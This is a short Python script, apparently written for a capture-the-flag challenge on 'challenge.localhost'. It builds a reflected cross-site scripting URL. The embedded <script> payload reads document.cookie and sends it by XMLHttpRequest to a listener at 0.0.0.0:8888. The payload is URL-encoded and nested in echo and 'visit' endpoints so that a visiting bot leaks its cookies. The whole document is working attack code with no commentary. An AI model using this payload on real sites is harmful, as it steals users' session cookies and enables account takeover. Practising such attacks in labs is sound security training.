import urllib.parse

payload = "<script>var cookies = document.cookie; var xhr = new XMLHttpRequest(); xhr.open('GET', `http://0.0.0.0:8888/log?cookie=${cookies}`, true); xhr.send();</script>"
encoded_payload = urllib.parse.quote(payload)

url = f'http://challenge.localhost/echo?echo=<a href="http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo={encoded_payload}">Visit</a>'
print(url)
